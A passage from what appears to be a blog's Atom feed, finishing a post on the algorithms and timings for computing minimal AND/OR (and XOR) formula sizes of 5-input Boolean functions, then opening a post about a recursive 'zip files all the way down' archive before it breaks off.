suppose we are looking for f such that fg = f OR g.&#xA;The equation is only possible to satisfy if fg OR g == fg.&#xA;That is, if g has any extraneous 1 bits, no f will work, so we can move on.&#xA;Otherwise, the remaining condition is that&#xA;f AND &amp;#172;g == fg AND &amp;#172;g.  That is, for the bit positions where g is 0, f must match fg.&#xA;The other bits of f (the bits where g has 1s)&#xA;can take any value.&#xA;We can enumerate the possible f values by recursively trying all&#xA;possible values for the &amp;ldquo;don&#39;t care&amp;rdquo; bits.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;func find(x, any, xsize):&#xA;    if size(x) == xsize&#xA;        return x&#xA;    while any != 0&#xA;        bit = any AND &amp;#8722;any  // rightmost 1 bit in any&#xA;        any = any AND &amp;#172;bit&#xA;        if f = find(x OR bit, any, xsize) succeeds&#xA;            return f&#xA;    return failure&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;It doesn&#39;t matter which 1 bit we choose for the recursion,&#xA;but finding the rightmost 1 bit is cheap: it is isolated by the&#xA;(admittedly surprising) expression &amp;ldquo;any AND &amp;#8722;any.&amp;rdquo;&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Given &lt;code&gt;find&lt;/code&gt;, the loop above can try these four cases:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;table id=find&gt;&#xA;&lt;tr&gt;&lt;th&gt;Formula &lt;th&gt;Condition &lt;th&gt;Base x &lt;th&gt;&amp;ldquo;Any&amp;rdquo; bits&#xA;&lt;tr&gt;&lt;td&gt;fg = f OR g &lt;td&gt;fg OR g == fg &lt;td&gt;fg AND &amp;#172;g &lt;td&gt;g&#xA;&lt;tr&gt;&lt;td&gt;fg = f OR &amp;#172;g &lt;td&gt;fg OR &amp;#172;g == fg &lt;td&gt;fg AND g &lt;td&gt;&amp;#172;g&#xA;&lt;tr&gt;&lt;td&gt;&amp;#172;fg = f OR g &lt;td&gt;&amp;#172;fg OR g == fg &lt;td&gt;&amp;#172;fg AND &amp;#172;g &lt;td&gt;g&#xA;&lt;tr&gt;&lt;td&gt;&amp;#172;fg = f OR &amp;#172;g &lt;td&gt;&amp;#172;fg OR &amp;#172;g == &amp;#172;fg &lt;td&gt;&amp;#172;fg AND g &lt;td&gt;&amp;#172;g&#xA;&lt;/table&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Rewriting the Boolean expressions to use only the four OR forms&#xA;means that we only need to write the &amp;ldquo;adding bits&amp;rdquo; version of find.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The final algorithm is:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;// Algorithm 5&#xA;func compute():&#xA;    for each function f&#xA;        size[f] = &amp;#8734;&#xA;&#xA;    for each single variable function f = v&#xA;        size[f] = 0&#xA;&#xA;    // Generate functions.&#xA;    for k = 1 to max_generate&#xA;        for each canonical function f&#xA;            for each function ff equivalent to f&#xA;                for each canonical function g of size k &amp;#8722; size(f) &amp;#8722; 1&#xA;                    visit(k, ff OR g)&#xA;                    visit(k, ff AND g)&#xA;                    visit(k, ff AND &amp;#172;g)&#xA;                    visit(k, &amp;#172;ff AND g)&#xA;&#xA;    // Search for functions.&#xA;    for k = max_generate+1 to &amp;#8734;&#xA;        for each missing function fg&#xA;            for each canonical function g&#xA;                fsize = k &amp;#8722; size(g) &amp;#8722; 1&#xA;                if fg OR g == fg&#xA;                    if f = find(fg AND &amp;#172;g, g, fsize) succeeds&#xA;                        visit(k, fg)&#xA;                        next fg&#xA;                if fg OR &amp;#172;g == fg&#xA;                    if f = find(fg AND g, &amp;#172;g, fsize) succeeds&#xA;                        visit(k, fg)&#xA;                        next fg&#xA;                if &amp;#172;fg OR g == &amp;#172;fg&#xA;                    if f = find(&amp;#172;fg AND &amp;#172;g, g, fsize) succeeds&#xA;                        visit(k, fg)&#xA;                        next fg&#xA;                if &amp;#172;fg OR &amp;#172;g == &amp;#172;fg&#xA;                    if f = find(&amp;#172;fg AND g, &amp;#172;g, fsize) succeeds&#xA;                        visit(k, fg)&#xA;                        next fg&#xA;        if nvisited == 2&lt;sup&gt;2&lt;sup&gt;n&lt;/sup&gt;&lt;/sup&gt;&#xA;            return&#xA;&#xA;func visit(d, fg):&#xA;    if size[fg] != &amp;#8734;&#xA;        return&#xA;&#xA;    record fg as canonical&#xA;&#xA;    for each function ffgg equivalent to fg&#xA;        if size[ffgg] != &amp;#8734;&#xA;            size[ffgg] = d&#xA;            nvisited += 2  // counts ffgg and &amp;#172;ffgg&#xA;    return&#xA;&#xA;func find(x, any, xsize):&#xA;    if size(x) == xsize&#xA;        return x&#xA;    while any != 0&#xA;        bit = any AND &amp;#8722;any  // rightmost 1 bit in any&#xA;        any = any AND &amp;#172;bit&#xA;        if f = find(x OR bit, any, xsize) succeeds&#xA;            return f&#xA;    return failure&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;To get a sense of the speedup here, and to check my work,&#xA;I ran the program using both algorithms&#xA;on a 2.53 GHz Intel Core 2 Duo E7200.&#xA;&lt;/p&gt;&#xA;&#xA;&#xA;&lt;center&gt;&#xA;&lt;table id=times&gt;&#xA;&lt;tr&gt;&lt;th&gt; &lt;th colspan=3&gt;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212; # of Functions &amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&lt;th colspan=2&gt;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212; Time &amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&#xA;&lt;tr&gt;&lt;th&gt;Size &lt;th&gt;Canonical &lt;th&gt;All &lt;th&gt;All, Cumulative &lt;th&gt;Generate &lt;th&gt;Search&#xA;&lt;tr&gt;&lt;td&gt;0 &lt;td&gt;1 &lt;td&gt;10 &lt;td&gt;10&#xA;&lt;tr&gt;&lt;td&gt;1 &lt;td&gt;2 &lt;td&gt;82 &lt;td&gt;92 &lt;td&gt;&amp;lt; 0.1 seconds &lt;td&gt;3.4 minutes&#xA;&lt;tr&gt;&lt;td&gt;2 &lt;td&gt;2 &lt;td&gt;640 &lt;td&gt;732 &lt;td&gt;&amp;lt; 0.1 seconds &lt;td&gt;7.2 minutes&#xA;&lt;tr&gt;&lt;td&gt;3 &lt;td&gt;7 &lt;td&gt;4420 &lt;td&gt;5152 &lt;td&gt;&amp;lt; 0.1 seconds &lt;td&gt;12.3 minutes&#xA;&lt;tr&gt;&lt;td&gt;4 &lt;td&gt;19 &lt;td&gt;25276 &lt;td&gt;29696 &lt;td&gt;&amp;lt; 0.1 seconds &lt;td&gt;30.1 minutes&#xA;&lt;tr&gt;&lt;td&gt;5 &lt;td&gt;44 &lt;td&gt;117440 &lt;td&gt;147136 &lt;td&gt;&amp;lt; 0.1 seconds &lt;td&gt;1.3 hours&#xA;&lt;tr&gt;&lt;td&gt;6 &lt;td&gt;142 &lt;td&gt;515040 &lt;td&gt;662176 &lt;td&gt;&amp;lt; 0.1 seconds &lt;td&gt;3.5 hours&#xA;&lt;tr&gt;&lt;td&gt;7 &lt;td&gt;436 &lt;td&gt;1999608 &lt;td&gt;2661784 &lt;td&gt;0.2 seconds &lt;td&gt;11.6 hours&#xA;&lt;tr&gt;&lt;td&gt;8 &lt;td&gt;1209 &lt;td&gt;6598400 &lt;td&gt;9260184 &lt;td&gt;0.6 seconds &lt;td&gt;1.7 days&#xA;&lt;tr&gt;&lt;td&gt;9 &lt;td&gt;3307 &lt;td&gt;19577332 &lt;td&gt;28837516 &lt;td&gt;1.7 seconds &lt;td&gt;4.9 days&#xA;&lt;tr&gt;&lt;td&gt;10 &lt;td&gt;7741 &lt;td&gt;50822560 &lt;td&gt;79660076 &lt;td&gt;4.6 seconds &lt;td&gt;[ 10 days ? ]&#xA;&lt;tr&gt;&lt;td&gt;11 &lt;td&gt;17257 &lt;td&gt;114619264 &lt;td&gt;194279340 &lt;td&gt;10.8 seconds &lt;td&gt;[ 20 days ? ]&#xA;&lt;tr&gt;&lt;td&gt;12 &lt;td&gt;31851 &lt;td&gt;221301008 &lt;td&gt;415580348 &lt;td&gt;21.7 seconds &lt;td&gt;[ 50 days ? ]&#xA;&lt;tr&gt;&lt;td&gt;13 &lt;td&gt;53901 &lt;td&gt;374704776 &lt;td&gt;790285124 &lt;td&gt;38.5 seconds &lt;td&gt;[ 80 days ? ]&#xA;&lt;tr&gt;&lt;td&gt;14 &lt;td&gt;75248 &lt;td&gt;533594528 &lt;td&gt;1323879652 &lt;td&gt;58.7 seconds &lt;td&gt;[ 100 days ? ]&#xA;&lt;tr&gt;&lt;td&gt;15 &lt;td&gt;94572 &lt;td&gt;667653642 &lt;td&gt;1991533294 &lt;td&gt;1.5 minutes &lt;td&gt;[ 120 days ? ]&#xA;&lt;tr&gt;&lt;td&gt;16 &lt;td&gt;98237 &lt;td&gt;697228760 &lt;td&gt;2688762054 &lt;td&gt;2.1 minutes &lt;td&gt;[ 120 days ? ]&#xA;&lt;tr&gt;&lt;td&gt;17 &lt;td&gt;89342 &lt;td&gt;628589440 &lt;td&gt;3317351494 &lt;td&gt;4.1 minutes &lt;td&gt;[ 90 days ? ]&#xA;&lt;tr&gt;&lt;td&gt;18 &lt;td&gt;66951 &lt;td&gt;468552896 &lt;td&gt;3785904390 &lt;td&gt;9.1 minutes &lt;td&gt;[ 50 days ? ]&#xA;&lt;tr&gt;&lt;td&gt;19 &lt;td&gt;41664 &lt;td&gt;287647616 &lt;td&gt;4073552006 &lt;td&gt;23.4 minutes &lt;td&gt;[ 30 days ? ]&#xA;&lt;tr&gt;&lt;td&gt;20 &lt;td&gt;21481 &lt;td&gt;144079832 &lt;td&gt;4217631838 &lt;td&gt;57.0 minutes &lt;td&gt;[ 10 days ? ]&#xA;&lt;tr&gt;&lt;td&gt;21 &lt;td&gt;8680 &lt;td&gt;55538224 &lt;td&gt;4273170062 &lt;td&gt;2.4 hours &lt;td&gt;2.5 days&#xA;&lt;tr&gt;&lt;td&gt;22 &lt;td&gt;2730 &lt;td&gt;16099568 &lt;td&gt;4289269630 &lt;td&gt;5.2 hours &lt;td&gt;11.7 hours&#xA;&lt;tr&gt;&lt;td&gt;23 &lt;td&gt;937 &lt;td&gt;4428800 &lt;td&gt;4293698430 &lt;td&gt;11.2 hours &lt;td&gt;2.2 hours&#xA;&lt;tr&gt;&lt;td&gt;24 &lt;td&gt;228 &lt;td&gt;959328 &lt;td&gt;4294657758 &lt;td&gt;22.0 hours &lt;td&gt;33.2 minutes&#xA;&lt;tr&gt;&lt;td&gt;25 &lt;td&gt;103 &lt;td&gt;283200 &lt;td&gt;4294940958 &lt;td&gt;1.7 days &lt;td&gt;4.0 minutes&#xA;&lt;tr&gt;&lt;td&gt;26 &lt;td&gt;21 &lt;td&gt;22224 &lt;td&gt;4294963182 &lt;td&gt;2.9 days &lt;td&gt;42 seconds&#xA;&lt;tr&gt;&lt;td&gt;27 &lt;td&gt;10 &lt;td&gt;3602 &lt;td&gt;4294966784 &lt;td&gt;4.7 days &lt;td&gt;2.4 seconds&#xA;&lt;tr&gt;&lt;td&gt;28 &lt;td&gt;3 &lt;td&gt;512 &lt;td&gt;4294967296 &lt;td&gt;[ 7 days ? ] &lt;td&gt;0.1 seconds&#xA;&lt;/table&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The bracketed times are estimates based on the work involved: I did not&#xA;wait that long for the intermediate search steps.&#xA;The search algorithm is quite a bit worse than generate until there are&#xA;very few functions left to find.&#xA;However, it comes in handy just when it is most useful: when the&#xA;generate algorithm has slowed to a crawl.&#xA;If we run generate through formulas of size 22 and then switch&#xA;to search for 23 onward, we can run the whole computation in&#xA;just over half a day of CPU time.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The computation of a(5) identified the sizes of all 616,126&#xA;canonical Boolean functions of 5 inputs.&#xA;In contrast, there are &lt;a href=&#34;http://oeis.org/A000370&#34;&gt;just over 200 trillion canonical Boolean functions of 6 inputs&lt;/a&gt;.&#xA;Determining a(6) is unlikely to happen by brute force computation, no matter what clever tricks we use.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;h3&gt;Adding XOR&lt;/h3&gt;&#xA;&#xA;&lt;p class=pp&gt;We&#39;ve assumed the use of just AND and OR as our&#xA;basis for the Boolean formulas.  If we also allow XOR, functions&#xA;can be written using many fewer operators.&#xA;In particular, a hardest function for the 1-, 2-, 3-, and 4-input&#xA;cases&amp;#8212;parity&amp;#8212;is now trivial.&#xA;Knuth examines the complexity of 5-input Boolean functions&#xA;using AND, OR, and XOR in detail in &lt;a href=&#34;http://www-cs-faculty.stanford.edu/~uno/taocp.html&#34;&gt;The Art of Computer Programming, Volume 4A&lt;/a&gt;.&#xA;Section 7.1.2&#39;s Algorithm L is the same as our Algorithm 3 above,&#xA;given for computing 4-input functions.&#xA;Knuth mentions that to adapt it for 5-input functions one must&#xA;treat only canonical functions and gives results for 5-input functions&#xA;with XOR allowed.&#xA;So another way to check our work is to add XOR to our Algorithm 4&#xA;and check that our results match Knuth&#39;s.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Because the minimum formula sizes are smaller (at most 12), the&#xA;computation of sizes with XOR is much faster than before:&#xA;&lt;/p&gt;&#xA;&#xA;&#xA;&lt;center&gt;&#xA;&lt;table&gt;&#xA;&lt;tr&gt;&lt;th&gt; &lt;th&gt;&lt;th colspan=5&gt;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212; # of Functions &amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&amp;#8212;&lt;th&gt;&#xA;&lt;tr&gt;&lt;th&gt;Size &lt;th width=10&gt;&lt;th&gt;Canonical &lt;th width=10&gt;&lt;th&gt;All &lt;th width=10&gt;&lt;th&gt;All, Cumulative &lt;th width=10&gt;&lt;th&gt;Time&#xA;&lt;tr&gt;&lt;td align=right&gt;0 &lt;td&gt;&lt;td align=right&gt;1 &lt;td&gt;&lt;td align=right&gt;10 &lt;td&gt;&lt;td align=right&gt;10 &lt;td&gt;&lt;td&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;1 &lt;td&gt;&lt;td align=right&gt;3 &lt;td&gt;&lt;td align=right&gt;102 &lt;td&gt;&lt;td align=right&gt;112 &lt;td&gt;&lt;td align=right&gt;&amp;lt; 0.1 seconds&#xA;&lt;tr&gt;&lt;td align=right&gt;2 &lt;td&gt;&lt;td align=right&gt;5 &lt;td&gt;&lt;td align=right&gt;1140 &lt;td&gt;&lt;td align=right&gt;1252 &lt;td&gt;&lt;td align=right&gt;&amp;lt; 0.1 seconds&#xA;&lt;tr&gt;&lt;td align=right&gt;3 &lt;td&gt;&lt;td align=right&gt;20 &lt;td&gt;&lt;td align=right&gt;11570 &lt;td&gt;&lt;td align=right&gt;12822 &lt;td&gt;&lt;td align=right&gt;&amp;lt; 0.1 seconds&#xA;&lt;tr&gt;&lt;td align=right&gt;4 &lt;td&gt;&lt;td align=right&gt;93 &lt;td&gt;&lt;td align=right&gt;109826 &lt;td&gt;&lt;td align=right&gt;122648 &lt;td&gt;&lt;td align=right&gt;&amp;lt; 0.1 seconds&#xA;&lt;tr&gt;&lt;td align=right&gt;5 &lt;td&gt;&lt;td align=right&gt;366 &lt;td&gt;&lt;td align=right&gt;936440 &lt;td&gt;&lt;td align=right&gt;1059088 &lt;td&gt;&lt;td align=right&gt;0.1 seconds&#xA;&lt;tr&gt;&lt;td align=right&gt;6 &lt;td&gt;&lt;td align=right&gt;1730 &lt;td&gt;&lt;td align=right&gt;7236880 &lt;td&gt;&lt;td align=right&gt;8295968 &lt;td&gt;&lt;td align=right&gt;0.7 seconds&#xA;&lt;tr&gt;&lt;td align=right&gt;7 &lt;td&gt;&lt;td align=right&gt;8782 &lt;td&gt;&lt;td align=right&gt;47739088 &lt;td&gt;&lt;td align=right&gt;56035056 &lt;td&gt;&lt;td align=right&gt;4.5 seconds&#xA;&lt;tr&gt;&lt;td align=right&gt;8 &lt;td&gt;&lt;td align=right&gt;40297 &lt;td&gt;&lt;td align=right&gt;250674320 &lt;td&gt;&lt;td align=right&gt;306709376 &lt;td&gt;&lt;td align=right&gt;24.0 seconds&#xA;&lt;tr&gt;&lt;td align=right&gt;9 &lt;td&gt;&lt;td align=right&gt;141422 &lt;td&gt;&lt;td align=right&gt;955812256 &lt;td&gt;&lt;td align=right&gt;1262521632 &lt;td&gt;&lt;td align=right&gt;95.5 seconds&#xA;&lt;tr&gt;&lt;td align=right&gt;10 &lt;td&gt;&lt;td align=right&gt;273277 &lt;td&gt;&lt;td align=right&gt;1945383936 &lt;td&gt;&lt;td align=right&gt;3207905568 &lt;td&gt;&lt;td align=right&gt;200.7 seconds&#xA;&lt;tr&gt;&lt;td align=right&gt;11 &lt;td&gt;&lt;td align=right&gt;145707 &lt;td&gt;&lt;td align=right&gt;1055912608 &lt;td&gt;&lt;td align=right&gt;4263818176 &lt;td&gt;&lt;td align=right&gt;121.2 seconds&#xA;&lt;tr&gt;&lt;td align=right&gt;12 &lt;td&gt;&lt;td align=right&gt;4423 &lt;td&gt;&lt;td align=right&gt;31149120 &lt;td&gt;&lt;td align=right&gt;4294967296 &lt;td&gt;&lt;td align=right&gt;65.0 seconds&#xA;&lt;/table&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Knuth does not discuss anything like Algorithm 5,&#xA;because the search for specific functions does not apply to&#xA;the AND, OR, and XOR basis.  XOR is a non-monotone&#xA;function (it can both turn bits on and turn bits off), so&#xA;there is no test like our &amp;ldquo;&lt;code&gt;if fg OR g == fg&lt;/code&gt;&amp;rdquo;&#xA;and no small set of &amp;ldquo;don&#39;t care&amp;rdquo; bits to trim the search for f.&#xA;The search for an appropriate f in the XOR case would have&#xA;to try all f of the right size, which is exactly what Algorithm 4 already does.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Volume 4A also considers the problem of building minimal circuits,&#xA;which are like formulas but can use common subexpressions additional times for free,&#xA;and the problem of building the shallowest possible circuits.&#xA;See Section 7.1.2 for all the details.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;h3&gt;Code and Web Site&lt;/h3&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The web site &lt;a href=&#34;http://boolean-oracle.swtch.com&#34;&gt;boolean-oracle.swtch.com&lt;/a&gt;&#xA;lets you type in a Boolean expression and gives back the minimal formula for it.&#xA;It uses tables generated while running Algorithm 5; those tables and the&#xA;programs described in this post are also &lt;a href=&#34;http://boolean-oracle.swtch.com/about&#34;&gt;available on the site&lt;/a&gt;.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;h3&gt;Postscript: Generating All Permutations and Inversions&lt;/h3&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The algorithms given above depend crucially on the step&#xA;&amp;ldquo;&lt;code&gt;for each function ff equivalent to f&lt;/code&gt;,&amp;rdquo;&#xA;which generates all the ff obtained by permuting or inverting inputs to f,&#xA;but I did not explain how to do that.&#xA;We already saw that we can manipulate the binary truth table representation&#xA;directly to turn &lt;code&gt;f&lt;/code&gt; into &lt;code&gt;&amp;#172;f&lt;/code&gt; and to compute&#xA;combinations of functions.&#xA;We can also manipulate the binary representation directly to&#xA;invert a specific input or swap a pair of adjacent inputs.&#xA;Using those operations we can cycle through all the equivalent functions.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;To invert a specific input,&#xA;let&#39;s consider the structure of the truth table.&#xA;The index of a bit in the truth table encodes the inputs for that entry.&#xA;For example, the low bit of the index gives the value of the first input.&#xA;So the even-numbered bits&amp;#8212;at indices 0, 2, 4, 6, ...&amp;#8212;correspond to&#xA;the first input being false, while the odd-numbered bits&amp;#8212;at indices 1, 3, 5, 7, ...&amp;#8212;correspond&#xA;to the first input being true.&#xA;Changing just that bit in the index corresponds to changing the&#xA;single variable, so indices 0, 1 differ only in the value of the first input,&#xA;as do 2, 3, and 4, 5, and 6, 7, and so on.&#xA;Given the truth table for f(V, W, X, Y, Z) we can compute&#xA;the truth table for f(&amp;#172;V, W, X, Y, Z) by swapping adjacent bit pairs&#xA;in the original truth table.&#xA;Even better, we can do all the swaps in parallel using a bitwise&#xA;operation.&#xA;To invert a different input, we swap larger runs of bits.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;table&gt;&#xA;&lt;tr&gt;&lt;th&gt;Function &lt;th width=10&gt; &lt;th&gt;Truth Table (&lt;span style=&#34;font-weight: normal;&#34;&gt;&lt;code&gt;f&lt;/code&gt; = f(V, W, X, Y, Z)&lt;/span&gt;)&#xA;&lt;tr&gt;&lt;td&gt;f(&amp;#172;V, W, X, Y, Z) &lt;td&gt;&lt;td&gt;&lt;code&gt;(f&amp;amp;0x55555555)&amp;lt;&amp;lt;&amp;nbsp;1 | (f&amp;gt;&amp;gt;&amp;nbsp;1)&amp;amp;0x55555555&lt;/code&gt;&#xA;&lt;tr&gt;&lt;td&gt;f(V, &amp;#172;W, X, Y, Z) &lt;td&gt;&lt;td&gt;&lt;code&gt;(f&amp;amp;0x33333333)&amp;lt;&amp;lt;&amp;nbsp;2 | (f&amp;gt;&amp;gt;&amp;nbsp;2)&amp;amp;0x33333333&lt;/code&gt;&#xA;&lt;tr&gt;&lt;td&gt;f(V, W, &amp;#172;X, Y, Z) &lt;td&gt;&lt;td&gt;&lt;code&gt;(f&amp;amp;0x0f0f0f0f)&amp;lt;&amp;lt;&amp;nbsp;4 | (f&amp;gt;&amp;gt;&amp;nbsp;4)&amp;amp;0x0f0f0f0f&lt;/code&gt;&#xA;&lt;tr&gt;&lt;td&gt;f(V, W, X, &amp;#172;Y, Z) &lt;td&gt;&lt;td&gt;&lt;code&gt;(f&amp;amp;0x00ff00ff)&amp;lt;&amp;lt;&amp;nbsp;8 | (f&amp;gt;&amp;gt;&amp;nbsp;8)&amp;amp;0x00ff00ff&lt;/code&gt;&#xA;&lt;tr&gt;&lt;td&gt;f(V, W, X, Y, &amp;#172;Z) &lt;td&gt;&lt;td&gt;&lt;code&gt;(f&amp;amp;0x0000ffff)&amp;lt;&amp;lt;16 | (f&amp;gt;&amp;gt;16)&amp;amp;0x0000ffff&lt;/code&gt;&#xA;&lt;/table&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Being able to invert a specific input lets us consider all possible&#xA;inversions by building them up one at a time.&#xA;The &lt;a href=&#34;http://oeis.org/A003188&#34;&gt;Gray code&lt;/a&gt; lets us&#xA;enumerate all possible 5-bit input codes while changing only 1 bit at&#xA;a time as we move from one input to the next:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;0, 1, 3, 2, 6, 7, 5, 4, &lt;br&gt;&#xA;12, 13, 15, 14, 10, 11, 9, 8, &lt;br&gt;&#xA;24, 25, 27, 26, 30, 31, 29, 28, &lt;br&gt;&#xA;20, 21, 23, 22, 18, 19, 17, 16&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;This minimizes&#xA;the number of inversions we need: to consider all 32 cases, we only&#xA;need 31 inversion operations.&#xA;In contrast, visiting the 5-bit input codes in the usual binary order 0, 1, 2, 3, 4, ...&#xA;would often need to change multiple bits, like when changing from 3 to 4.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;To swap a pair of adjacent inputs, we can again take advantage of the truth table.&#xA;For a pair of inputs, there are four cases: 00, 01, 10, and 11.  We can leave the&#xA;00 and 11 cases alone, because they are invariant under swapping,&#xA;and concentrate on swapping the 01 and 10 bits.&#xA;The first two inputs change most often in the truth table: each run of 4 bits&#xA;corresponds to those four cases.&#xA;In each run, we want to leave the first and fourth alone and swap the second and third.&#xA;For later inputs, the four cases consist of sections of bits instead of single bits.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;table&gt;&#xA;&lt;tr&gt;&lt;th&gt;Function &lt;th width=10&gt; &lt;th&gt;Truth Table (&lt;span style=&#34;font-weight: normal;&#34;&gt;&lt;code&gt;f&lt;/code&gt; = f(V, W, X, Y, Z)&lt;/span&gt;)&#xA;&lt;tr&gt;&lt;td&gt;f(&lt;b&gt;W, V&lt;/b&gt;, X, Y, Z) &lt;td&gt;&lt;td&gt;&lt;code&gt;f&amp;amp;0x99999999 | (f&amp;amp;0x22222222)&amp;lt;&amp;lt;1 | (f&amp;gt;&amp;gt;1)&amp;amp;0x22222222&lt;/code&gt;&#xA;&lt;tr&gt;&lt;td&gt;f(V, &lt;b&gt;X, W&lt;/b&gt;, Y, Z) &lt;td&gt;&lt;td&gt;&lt;code&gt;f&amp;amp;0xc3c3c3c3 | (f&amp;amp;0x0c0c0c0c)&amp;lt;&amp;lt;1 | (f&amp;gt;&amp;gt;1)&amp;amp;0x0c0c0c0c&lt;/code&gt;&#xA;&lt;tr&gt;&lt;td&gt;f(V, W, &lt;b&gt;Y, X&lt;/b&gt;, Z) &lt;td&gt;&lt;td&gt;&lt;code&gt;f&amp;amp;0xf00ff00f | (f&amp;amp;0x00f000f0)&amp;lt;&amp;lt;1 | (f&amp;gt;&amp;gt;1)&amp;amp;0x00f000f0&lt;/code&gt;&#xA;&lt;tr&gt;&lt;td&gt;f(V, W, X, &lt;b&gt;Z, Y&lt;/b&gt;) &lt;td&gt;&lt;td&gt;&lt;code&gt;f&amp;amp;0xff0000ff | (f&amp;amp;0x0000ff00)&amp;lt;&amp;lt;8 | (f&amp;gt;&amp;gt;8)&amp;amp;0x0000ff00&lt;/code&gt;&#xA;&lt;/table&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Being able to swap a pair of adjacent inputs lets us consider all&#xA;possible permutations by building them up one at a time.&#xA;Again it is convenient to have a way to visit all permutations by&#xA;applying only one swap at a time.&#xA;Here Volume 4A comes to the rescue.&#xA;Section 7.2.1.2 is titled &amp;ldquo;Generating All Permutations,&amp;rdquo; and Knuth delivers&#xA;many algorithms to do just that.&#xA;The most convenient for our purposes is Algorithm P, which&#xA;generates a sequence that considers all permutations exactly once&#xA;with only a single swap of adjacent inputs between steps.&#xA;Knuth calls it Algorithm P because it corresponds to the&#xA;&amp;ldquo;Plain changes&amp;rdquo; algorithm used by &lt;a href=&#34;http://en.wikipedia.org/wiki/Change_ringing&#34;&gt;bell ringers in 17th century England&lt;/a&gt;&#xA;to ring a set of bells in all possible permutations.&#xA;The algorithm is described in a manuscript written around 1653!&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;We can examine all possible permutations and inversions by&#xA;nesting a loop over all permutations inside a loop over all inversions,&#xA;and in fact that&#39;s what my program does.&#xA;Knuth does one better, though: his Exercise 7.2.1.2-20&#xA;suggests that it is possible to build up all the possibilities&#xA;using only adjacent swaps and inversion of the first input.&#xA;Negating arbitrary inputs is not hard, though, and still does&#xA;minimal work, so the code sticks with Gray codes and Plain changes.&#xA;&lt;/p&gt;&lt;/p&gt;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;</content>
  </entry>
  <entry>
    <title>Zip Files All The Way Down</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/zip</id>
    <link rel="alternate" href="http://research.swtch.com/zip"></link>
    <published>2010-03-18T00:00:00-04:00</published>
    <updated>2010-03-18T00:00:00-04:00</updated>
    <summary type="text">Did you think it was turtles?</summary>
    <content type="html">&#xA;&lt;p&gt;&lt;p class=lp&gt;&#xA;Stephen Hawking begins &lt;i&gt;&lt;a href=&#34;http://www.amazon.com/-/dp/0553380168&#34;&gt;A Brief History of Time&lt;/a&gt;&lt;/i&gt; with this story:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;&lt;p class=pp&gt;&#xA;A well-known scientist (some say it was Bertrand Russell) once gave a public lecture on astronomy. He described how the earth orbits around the sun and how the sun, in turn, orbits around the center of a vast collection of stars called our galaxy. At the end of the lecture, a little old lady at the back of the room got up and said: &amp;ldquo;What you have told us is rubbish. The world is really a flat plate supported on the back of a giant tortoise.&amp;rdquo; The scientist gave a superior smile before replying, &amp;ldquo;What is the tortoise standing on?&amp;rdquo;  &amp;ldquo;You&#39;re very clever, young man, very clever,&amp;rdquo; said the old lady. &amp;ldquo;But it&#39;s turtles all the way down!&amp;rdquo;&#xA;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Scientists today are pretty sure that the universe is not actually turtles all the way down,&#xA;but we can create that kind of situation in other contexts.&#xA;For example, here we have &lt;a href=&#34;http://www.youtube.com/watch?v=Y-gqMTt3IUg&#34;&gt;video monitors all the way down&lt;/a&gt;&#xA;and &lt;a href=&#34;http://www.amazon.com/gp/customer-media/product-gallery/0387900926/ref=cm_ciu_pdp_images_all&#34;&gt;set theory books all the way down&lt;/a&gt;,&#xA;and &lt;a href=&#34;http://blog.makezine.com/archive/2009/01/thousands_of_shopping_carts_stake_o.html&#34;&gt;shopping carts all the way down&lt;/a&gt;.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;And here&#39;s a computer storage equivalent:&#xA;look inside &lt;a href=&#34;http://swtch.com/r.zip&#34;&gt;&lt;code&gt;r.zip&lt;/code&gt;&lt;/a&gt;.&#xA;It&#39;s zip files all the way down:&#xA;each one contains another zip file under the name &lt;code&gt;r/r.zip&lt;/code&gt;.&#xA;(For the die-hard Unix fans, &lt;a 